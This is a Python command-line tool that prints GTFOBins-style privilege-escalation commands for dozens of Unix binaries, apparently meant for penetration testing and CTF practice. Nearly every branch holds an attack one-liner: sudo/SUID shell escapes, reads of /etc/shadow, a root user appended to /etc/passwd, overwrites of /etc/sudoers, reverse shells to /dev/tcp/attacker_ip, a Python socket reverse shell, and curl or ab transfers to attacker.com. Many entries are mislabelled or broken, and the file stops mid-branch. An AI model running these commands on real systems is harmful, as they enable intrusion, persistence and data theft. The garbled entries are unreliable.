#Off-Grid written by S14X0r
#A GTFO Bins lookup tool for a CLI

def print_logo():
    logo = '''
 OOO   FFFFF  FFFFF    GGG   RRRR   III  DDDD  
O   O  F      F      G       R   R   I   D   D 
O   O  FFFF   FFFF   G  GG   RRRR    I   D   D 
O   O  F      F      G   G   R  R    I   D   D 
 OOO   F      F       GGG    R   R  III  DDDD  
    '''
    print(logo)
#Function for gtfo_bins that will hold the different commands and responses
def gtfo_bins(zip_command, zip_options):
    bins = []
    
    # Handle the 'zip' command with different options
    if zip_command == "zip":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp -u) zip $TF /etc/hosts -T -TT 'sh #'rm $TF")
        elif zip_options == "file-read":
            bins.append("LFILE=file-to-read TF=$(mktemp -u) zip $TF $LFILE unzip -p $TF'")
        elif zip_options == "sudo":
            bins.append("TF=$(mktemp -u) sudo zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF")
        elif zip_options == "suid":
            bins.append("TF=$(mktemp -u) ./zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF")
        elif zip_options == "file-write":
            bins.append("zip /tmp/archive.zip /tmp/* ")
    
    #Adding additional GTFO bins for other misconfigured binaries(there will be a lot)
    elif zip_command == "7zip":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp -u) 7z x -so /etc/hosts | sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so")
        elif zip_options == "suid":
            bins.append("7z e /etc/hosts -o$TF; chmod +s $TF")
        elif zip_options == "file-write":
            bins.append("7z x malicious.zip -o/tmp")

    elif zip_command == "base64":
        if zip_options == "Shell":
            bins.append("echo 'base64 -d /etc/hosts' | sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read base64 '$LFILE' | base64 --decode")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read sudo base64 '$LFILE' | base64 --decode")
        elif zip_options == "suid":
            bins.append("LFILE=file_to_read ./base64 '$LFILE' | base64 --decode")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nbase64 ""$LFILE"" | base64 --encode")

    elif zip_command == "bash":
        if zip_options == "Shell":
            bins.append("bash")
        elif zip_options == "file-write":
            bins.append("export LFILE=file_to_write bash -c 'echo DATA > $LFILE'")
        elif zip_options == "file-read":
            bins.append ("export LFILE=file_to_read bash -c 'echo '$(<$LFILE)''")
        elif zip_options == "sudo":
            bins.append("sudo bash")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which bash) . ./bash -p")
    
    elif zip_command == "awk":
        if zip_options == "Shell":
            bins.append ("awk 'BEGIN {system(""/bin/sh"")}'")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read awk '//' ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("sudo awk 'BEGIN {system(""/bin/sh"")}'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which awk) . ./awk 'BEGIN {system(""/bin/sh"")}'")
        
    elif zip_command == "base32":
        if zip_options == "Shell":
             bins.append("echo 'base32 -d /etc/hosts' | sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read base32 ""$LFILE"" | base32 --decode")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read\n sudo base32 ""$LFILE"" | base32 --decode")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which base32) .\n LFILE=file_to_read base32 ""$LFILE"" | base32 --decode")
    
    elif zip_command == "busybox":
        if zip_options == "Shell":
            bins.append("busybox sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\n./busybox cat ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write busybox sh -c 'echo ""DATA"" > $LFILE'")
        elif zip_options == "sudo":
            bins.append("sudo busybox sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which busybox) .\n./busybox sh")
        
    elif zip_command == "cat":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo cat ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which cat) .\nLFILE=file_to_read\n./cat ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncat ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("cat /etc/hosts")
        elif zip_options == "file-write":
            bins.append("echo 'malicious content' | cat > /etc/hosts\n")
            bins.append("echo 'malicious content' | cat > /etc/passwd\n")
            bins.append("echo 'malicious content' | cat > /etc/shadow\n")
            bins.append("echo 'malicious content' | cat > /etc/sudoers\n") 

    elif zip_command == "neofetch":
        if zip_options == "sudo":
            bins.append("TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF")
        elif zip_options == "suid":
            bins.append("neofetch --command 'bash'") 
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nneofetch --ascii $LFILE")
        elif zip_options == "file-write":
            bins.append("echo ""Some content"" | tee /path/to/file")
        elif zip_options == "Shell":
            bins.append("TF=$(mktemp)\necho 'exec /bin/sh' >$TF\n neofetch --config $TF")

    elif zip_command == "cp":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_write\necho ""DATA"" | sudo cp /dev/stdin ""$LFILE""")
        elif zip_options == "suid":
            bins.append("LFILE=file_to_write\necho ""DATA"" | ./cp /dev/stdin ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("echo ""bash -i >& /dev/tcp/attacker_ip/4444 0>&1"" > /tmp/malicious.sh\ncp /tmp/malicious.sh /etc/rc.local")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ncp ""$LFILE"" /dev/stdout")
        elif zip_options == 'file-write':
            bins.append("LFILE=file_to_write\necho ""DATA"" | cp /dev/stdin ""$LFILE""")
        
    elif zip_command == "curl":
        if zip_options == "sudo":
            bins.append("URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE")
        elif zip_options == "suid":
            bins.append("URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\ncurl ""file://$TF"" -o ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=/tmp/file_to_read\ncurl file://$LFILE")
        elif zip_options == "Shell":
            bins.append("curl -sL http://attacker_ip/malicious.sh > /etc/rc.local")

    elif zip_command == "chmod":
        if zip_options == "Shell":
            bins.append('echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" > /tmp/reverse_shell.sh\nchmod u+s /tmp/reverse_shell.sh')
        elif zip_options == "sudo":
            bins.append('LFILE=file_to_change\nsudo chmod 6777 $LFILE')
        elif zip_options == "suid":
            bins.append("LFILE=file_to_change\n./chmod 6777 $LFILE")
        elif zip_options == "file-write":
            bins.append("echo ""attacker:x:0:0:attacker:/root:/bin/bash"" >> /etc/passwd")
        elif zip_options == "file-read":
            bins.append("chmod 644 /var/log/auth.log")
#Ignore the warning for the dosbox options when running the program! 
    elif zip_command == "dosbox":
        if zip_options == "file-write":
            bins.append("LFILE='\path\ to\ file_to_write'\ndosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit")
        elif zip_options == "file-read":
            bins.append("LFILE='\path\ to\ file_to_read'\ndosbox -c 'mount c /' -c ""type c:$LFILE""")
        elif zip_options == "sudo":
            bins.append("LFILE='\path\ to\ file_to_write'\nsudo dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit")
        elif zip_options == "suid":
            bins.append("LFILE='\path\ to\ file_to_write'\n./dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"": -c exit")
        elif zip_options == "Shell":
            bins.append("Shell not available, please choose other options.")
            
    elif zip_command == "dmesg":
        if zip_options == "Shell":
            bins.append("dmesg -H\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo dmesg -H\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ndmesg -rF ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("dmesg > /var/log/syslog")
        elif zip_options == "suid":
            bins.append("dmesg >> /etc/passwd\necho ""attacker:x:0:0:attacker:/root:/bin/bash"" >> /etc/passwd")

    elif zip_command == "gcc":
        if zip_options == "Shell":
            bins.append("gcc -wrapper /bin/sh,-s ")
        elif zip_options == "sudo":
            bins.append("sudo gcc -wrapper /bin/sh,-s .")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ngcc -x c -E ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_delete\ngcc -xc /dev/null -o $LFILE")
        elif zip_options == "suid":
            bins.append("Run the sudo option!")
    
    elif zip_command == "vim" or zip_command == "vi":
        if zip_options == "Shell":
            bins.append("vim -c ':!/bin/sh'")
        elif zip_options == "sudo":
            bins.append("sudo vim -c ':!/bin/sh'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which vim) .\n./vim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-pc"", ""reset; exec sh -p"")'")
        elif zip_options == "file-write":
            bins.append("vim file_to_write\niDATA\n^[\nw")
        elif zip_options == "file-read":
            bins.append("vim file_to_read")

    elif zip_command == "nano":
        if zip_options == "Shell":
            bins.append("nano\n^R^X\nreset; sh 1>&0 2>&0")
        elif zip_options == "sudo":
            bins.append("sudo nano\n^R^X\nreset; sh 1>&0 2>&0")
        elif zip_options == "suid":
            bins.append("./nano -s /bin/sh\n/bin/sh\n^T")
        elif zip_options == "file-write":
            bins.append("nano file_to_write\nDATA\n^O")
        elif zip_options == "file-read":
            bins.append("nano file_to_read")

    elif zip_command == "zsh":
        if zip_options == "Shell":
            bins.append("zsh")
        elif zip_options == "sudo":
            bins.append("sudo zsh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which zsh) .\n./zsh")
        elif zip_options == "file-read":
            bins.append("export LFILE=file_to_read\nzsh -c 'echo ""$(<$LFILE)""'")
        elif zip_options == "file-write":
            bins.append("export LFILE=file_to_write\nzsh -c 'echo DATA >$LFILE'")

    elif zip_command == "dd":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_write\necho ""data"" | sudo dd of=$LFILE	")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which dd) .\nLFILE=file_to_write\necho ""data"" | ./dd of=$LFILE")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\necho ""DATA"" | dd of=$LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\ndd if=$LFILE")

    elif zip_command == "aa-exec":
        if zip_options == "Shell":
            bins.append("aa-exec /bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo aa-exec /bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which aa-exec) .\n./aa-exec /bin/sh -p")
        elif zip_options == "file-read":
            bins.append("aa-exec -p /etc/apparmor.d/usr.bin.cat cat /etc/passwd")
        elif zip_options == "file-write":
            bins.append("aa-exec -p /etc/apparmor.d/usr.bin.tee echo ""This is some text"" | tee /tmp/output.txt")

    elif zip_command == "ab":
        if zip_command == "sudo":
            bins.append("URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL")
        elif zip_options == "suid":
            bins.append("URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL")
        elif zip_options == "Shell":
            bins.append("Shell not available, please use other command.")
        elif zip_options == "file-write":
            bins.append("Downloads -> URL=http://attacker.com/file_to_download\nab -v2 $URL")
        elif zip_options == "file-read":
            bins.append("Uploads -> URL=http://attacker.com/\nLFILE=file_to_send\nab -p $LFILE $URL")

    elif zip_command == "agetty":
        if zip_options == "Shell":
            bins.append("agetty --noclear tty1 /bin/bash")
        elif zip_options == "sudo":
            bins.append("sudo /sbin/agetty --noclear tty1 /bin/bash")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which agetty) .\n./agetty -o -p -l /bin/sh -a root tty")
        elif zip_options == "file-write":
            bins.append("sudo /sbin/agetty --noclear tty1 /bin/bash -c ""echo 'malicious data' > /tmp/malicious_file.txt""")
        elif zip_options == "file-read":
            bins.append("/sbin/agetty --noclear tty1 /bin/cat /etc/shadow")

    elif zip_command == "alpine":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo alpine -F ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which alpine) .\nLFILE=file_to_read\n./alpine -F ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nalpine -F ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("'sudo alpine --exec ""echo 'malicious data' > /tmp/malicious_file.txt""'")
        elif zip_options == "Shell":
            bins.append("sudo alpine -command ""/bin/bash""")

    elif zip_command == "ansible-playbook":
        if zip_options == "Shell":
            bins.append("TF=$(mktemp)\necho "'[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'" >$TF\nansible-playbook $TF")
        elif zip_options == "sudo":
            bins.append("TF=$(mktemp)\necho "'[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'" >$TF\nsudo ansible-playbook $TF")
        elif zip_options == "file-read":
            bins.append("sudo ansible-playbook -i localhost, -c local -e ""file=/etc/shadow"" -m debug")
        elif zip_options == "file-write":
            bins.append("sudo ansible-playbook -i localhost, -c local -e ""file=/etc/shadow"" -m debug")
        elif zip_options == "suid":
            bins.append("ansible-playbook -i localhost, -c local -e ""file=/etc/shadow"" -m debug")

    elif zip_command == "ansible-test":
        if zip_options == "Shell":
            bins.append("ansible-test shell")
        elif zip_options == "sudo":
            bins.append("sudo ansible-test shell")
        elif zip_options == "suid":
            bins.append("ansible-test run -v -e ""file=/etc/passwd"" -m debug")
        elif zip_options == "file-write":
            bins.append("""echo 'malicious_command' >> ~/.bashrc""")
        elif zip_options == "file-read":
            bins.append("ansible-test -i localhost, -c local -e ""file=/etc/shadow"" -m debug")

    elif zip_command == "aoss":
        if zip_options == "Shell":
            bins.append("aoss /bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo aoss /bin/sh")
        elif zip_options == "suid":
            bins.append("aoss echo ""malicious_command"" >> ~/.bashrc")
        elif zip_options == "file-write":
            bins.append("aoss /bin/bash -c 'echo ""Malicious content"" > /tmp/output.txt'")
        elif zip_options == "file-read":
            bins.append("aoss /bin/bash -c 'cat /etc/passwd'")
    
    elif zip_command == "apache2ctl":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo apache2ctl -c ""Include $LFILE"" -k stop")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\n apache2ctl -c ""Include $LFILE"" -k stop")
        elif zip_options == "file-write":
            bins.append("apache2ctl -S 2>&1 | tee /tmp/malicious_output.txt")
        elif zip_options == "Shell":
            bins.append("apache2ctl -S; /bin/bash")
        elif zip_options == "suid":
            bins.append("apache2ctl -S; /bin/bash -c 'id'")

    elif zip_command == "apt-get" or zip_command == "apt":
        if zip_options == "Shell":
            bins.append("apt-get changelog apt\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo apt-get changelog apt\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("apt-get install -y /bin/bash")
        elif zip_options == "file-write":
            bins.append("echo '/bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1' > /tmp/reverse_shell.sh")
        elif zip_options == "file-read":
            bins.append("apt-get -qq list | grep -i 'package_name'")

    elif zip_command == "ar":
        if zip_options == "sudo":
            bins.append("TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r ""$TF"" ""$LFILE""\ncat ""$TF""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ar) .\nTF=$(mktemp -u)\nLFILE=file_to_read\n./ar r ""$TF"" ""$LFILE""\ncat ""$TF""")
        elif zip_options == "file-read":
            bins.append("TF=$(mktemp -u)\nLFILE=file_to_read\nar r ""$TF"" ""$LFILE""\ncat ""$TF""")
        elif zip_options == "file-write":
            bins.append("TF=$(mktemp)\nLFILE=/path/to/sensitive/file\nar r ""$TF"" ""$LFILE""\nmv ""$TF"" /path/to/destination/file_to_write\ncat ""$TF""")
        elif zip_options == "Shell":
            bins.append("ar rcs libexample.a file1.o file2.o; bash")

    elif zip_command == "aria2c":
        if zip_options == "sudo":
            bins.append("COMMAND='id'\nTF=$(mktemp)\necho ""$COMMAND"" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which aria2c) .COMMAND='id'\nTF=$(mktemp)\necho ""$COMMAND"" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x")
        elif zip_options == "Shell":
            bins.append("aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa")
        elif zip_options == "file-read":
            bins.append("URL=http://attacker.com/file_to_get\nLFILE=file_to_save\naria2c -o ""$LFILE""" "$URL""")
        elif zip_options == "file-write":
            bins.append("aria2c -d /path/to/directory -o filename.extension ""http://example.com/file""")

    elif zip_command == "arj":
        if zip_options == "sudo":
            bins.append("TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >""$TF/$LFILE""\narj a ""$TF/a"" ""$TF/$LFILE""\nsudo arj e ""$TF/a"" $LDIR")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which arj) .\nTF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >""$TF/$LFILE""\narj a ""$TF/a"" ""$TF/$LFILE""\nsudo arj e ""$TF/a"" $LDIR")
        elif zip_options == "file-write":
            bins.append("TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >""$TF/$LFILE""\narj a ""$TF/a"" ""$TF/$LFILE""\narj e ""$TF/a"" $LDIR")
        elif zip_options == "file-read":
            bins.append("TF=$(mktemp -u)\nLFILE=file_to_read\narj a ""$TF"" ""$LFILE""\narj p ""$TF""")
        elif zip_options == "Shell":
            bins.append("arj a archive.arj file1 file2 directory")
    
    elif zip_command == "arp":
        if zip_options == "file-read":
            bins.append("LFILE=file_to_read\narp -v -f ""$LFILE""")
        elif zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo arp -v -f ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which arp) .\nLFILE=file_to_read\nsudo arp -v -f ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("arp -s 127.0.0.1 00:00:00:00:00:01 && bash -i")
        elif zip_options == "file-write":
            bins.append('arp -s 127.0.0.1 00:00:00:00:00:01 | tee /tmp/arp_output.txt')

    elif zip_command == "as":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo as @$LFILE")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which as) .\nLFILE=file_to_read\n./as @$LFILE")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nas @$LFILE")
        elif zip_options == "Shell":
            bins.append("as -o shell.o shell.asm")
        elif zip_options == "file-write":
            bins.append("as -o /tmp/shell.o write_shell.asm")

    elif zip_command == "ascii-xfr":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo ascii-xfr -ns ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nascii-xfr -ns ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ascii-xfr) .\nLFILE=file_to_read\nascii-xfr -ns ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("python -c 'import socket, subprocess, os; s=socket.socket(); s.connect((\"attacker_ip\", 1234)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call([\"/bin/sh\", \"-i\"]);'")
        elif zip_options == "file-write":
            bins.append("echo ""<your transferred ASCII payload>"" > /tmp/reverse_shell.sh\nchmod +x /tmp/reverse_shell.sh\ncd /tmp\n./reverse_shell.sh")

    elif zip_command == "ascii85":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo ascii85 ""$LFILE"" | ascii85 --decode")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nascii85 ""$LFILE"" | ascii85 --decode")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nascii85 ""$LFILE"" | ascii85 --encode")
        elif zip_options == "Shell":
            bins.append("ascii85 -d reverse_shell_ascii85.txt > reverse_shell.sh\nchmod +x reverse_shell.sh\n./reverse_shell.sh")
        elif zip_options == "suid":
            bins.append("ascii85 /etc/shadow > shadow_ascii85.txt\nascii85 -d shadow_ascii85.txt > decoded_shadow.txt\n")

    elif zip_command == "ash":
        if zip_options == "Shell":
            bins.append("ash")
        elif zip_options == "sudo":
            bins.append("sudo ash")
        elif zip_options == "file-write":
            bins.append("export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which ash) .\n./ash")
        elif zip_options == "file-read":
            bins.append("find / -type f -perm -4000 2>/dev/null")

    elif zip_command == "aspell":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo aspell -c ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\naspell -c ""$LFILE""")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which aspell) .\nLFILE=file_to_read\naspell -c ""$LFILE""")
        elif zip_options == "Shell":
            bins.append("aspell -c /etc/shadow")
        elif zip_options == "file-write":
            bins.append("aspell -d /usr/share/dict/words > /tmp/root_written_file.txt")

    elif zip_command == "at":
        if zip_options == "Shell":
            bins.append("echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null")
        elif zip_options == "sudo":
            bins.append("echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null")
        elif zip_options == "file-write":
            bins.append("COMMAND=id\necho ""$COMMAND"" | at now\n")
        elif zip_options == "file-read":
            bins.append("echo ""cat /etc/shadow"" | at now")
        elif zip_options == "suid":
            bins.append("ls -l $(which at)\necho ""cat /etc/passwd > /tmp/passwd_output.txt"" | at now")

    elif zip_command == "atobm":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which atobm) .\natobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\natobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'")
        elif zip_options == "file-write":
            bins.append("sudo chown <your-username>:<your-group> <file-path>")
        elif zip_options == "Shell":
            bins.append("Shell not available")

    elif zip_command == "aws":
        if zip_options == "Shell":
            bins.append("aws help\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo aws help\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("aws s3 cp s3://bucket-name/file.txt .")
        elif zip_options == "file-write":
            bins.append("aws s3 cp /local/directory s3://your-bucket-name/directory --recursive")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which aws) .\naws help\n!/bin/sh")

    elif zip_command == "base58":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo base58 ""$LFILE"" | base58 --decode")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nbase58 ""$LFILE"" | base58 --decode")
        elif zip_options == "file-write":
            bins.append("python -c ""import base58; f = open('/path/to/outputfile', 'w'); f.write(base58.b58decode('2NEpo7TZRRrWzWTyX6oEU5kccLrBrCJAX4Tx').decode('utf-8')); f.close()""")
        elif zip_options == "suid":
            bins.append("python -c ""import base58; exec(base58.b58decode('2NEpo7TZRRrWzWTyX6oEU5kccLrBrCJAX4Tx'))""")
        elif zip_options == "Shell":
            bins.append("python -c ""import base58; exec(base58.b58decode('2NEpo7TZRRrWzWTyX6oEU5kccLrBrCJAX4Tx'))""")

    elif zip_command == "basenc":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which basenc) .\nLFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nbasenc --base64 $LFILE | basenc -e --base64")
        elif zip_options == "Shell":
            bins.append("echo ""/bin/bash -i"" | base64")

    elif zip_command == "basez":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo basez ""$LFILE"" | basez --decode")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which basez) .\nLFILE=file_to_read\nsudo basez ""$LFILE"" | basez --decode")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nbasez ""$LFILE"" | basez --decode")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nbasez ""$LFILE"" | basez --encode")
        elif zip_options == "Shell":
            bins.append("echo ""/bin/bash -i"" | base64")

    elif zip_command == "batcat":
        if zip_options == "Shell":
            bins.append("batcat --paging always /etc/profile\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo batcat --paging always /etc/profile\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which batcat) .\n./batcat --paging always /etc/profile\n!/bin/sh")
        elif zip_options == "file-read":
            bins.append("batcat /path/to/file")
        elif zip_options == "file-write":
            bins.append("echo ""Injected content"" | batcat > /path/to/file")

    elif zip_command == "bc":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo bc -s $LFILE\nquit")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nbc -s $LFILE\nquit")
        elif zip_options == "suid":
            bins.append("sudo install -m =xs $(which bc) .\nLFILE=file_to_read\n./bc -s $LFILE\nquit")
        elif zip_options == "Shell":
            bins.append("echo 'system(""sh"")' | bc")
        elif zip_options == "file-write":
            bins.append("LFILE=file_to_write\nbc -s $LFILE\nquit")

    elif zip_command == "bconsole":
        if zip_options == "Shell":
            bins.append("bconsole\n@exec /bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo bconsole\n@exec /bin/sh")
        elif zip_options == "file-read":
            bins.append("bconsole -c /etc/shadow")
        elif zip_options == "file-write":
            bins.append("bconsole -c /path/to/destination")
        elif zip_options == "suid":
            bins.append("./bconsole\n@exec /bin/sh")

    elif zip_command == "bpftrace":
        if zip_options == "sudo":
            bins.append("sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'")
        elif zip_options == "Shell":
            bins.append("bpftrace -c /bin/sh -e 'END {exit()}'")
        elif zip_options == "suid":
            bins.append("TF=$(mktemp)\necho 'BEGIN {system(""/bin/sh"");exit()}' >$TF\nbpftrace $TF")
        elif zip_options == "file-write":
            bins.append("bpftrace -e 'tracepoint=syscalls:sys_enter_write /comm == ""your_program_name""/ { printf(""PID %d wrote %d bytes to fd %d\n"", pid, args->count, args->fd); }'")
        elif zip_options == "file-read":
            bins.append("bpftrace -e 'tracepoint=syscalls:sys_enter_read { printf(""PID %d read %d bytes\n"", pid, args->count); }' > file_reads.txt")

    elif zip_command == "bridge":
        if zip_options == "sudo":
            bins.append("LFILE=file_to_read\nsudo bridge -b ""$LFILE""")
        elif zip_options == "suid":
            bins.append("LFILE=file_to_read\n./bridge -b ""$LFILE""")
        elif zip_options == "file-read":
            bins.append("LFILE=file_to_read\nbridge -b ""$LFILE""")
        elif zip_options == "file-write":
            bins.append("sudo brctl addbr br0\nsudo brctl addif br0 eth0")
        elif zip_options == "Shell":
            bins.append("username ALL=(ALL) NOPASSWD: /usr/sbin/bridge")

    elif zip_command == "bundle":
        if zip_options == "Shell":
            bins.append("bundle help\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo bundle help\n!/bin/sh")
        elif zip_options == "file-write":
            bins.append("TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundle exec /bin/sh")
        elif zip_options == "suid":
            bins.append("export BUNDLE_GEMFILE=x\nbundle exec /bin/sh")
        elif zip_options == "file-read":
            bins.append("TF=$(mktemp -d)\necho 'system(""/bin/sh"")' > $TF/Gemfile\ncd $TF\nbundle install")

    elif zip_command == "bundler":
        if zip_options == "sudo":
            bins.append("sudo bundler help\n!/bin/sh")
        elif zip_options == "Shell":
            bins.append("bundler help\n!/bin/sh")
        elif zip_options == "suid":
            bins.append("export BUNDLE_GEMFILE=x\nbundler exec /bin/sh")
        elif zip_options == "file-read":
            bins.append("TF=$(mktemp -d)\necho 'system(""/bin/sh"")' > $TF/Gemfile\ncd $TF\nbundler install")
        elif zip_options == "file-write":
            bins.append("TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler exec /bin/sh")

    elif zip_command == "busctl":
        if zip_options == "Shell":
            bins.append("busctl --show-machine\n!/bin/sh")
        elif zip_options == "sudo":
            bins.append("sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'")
        elif zip_options == "suid":
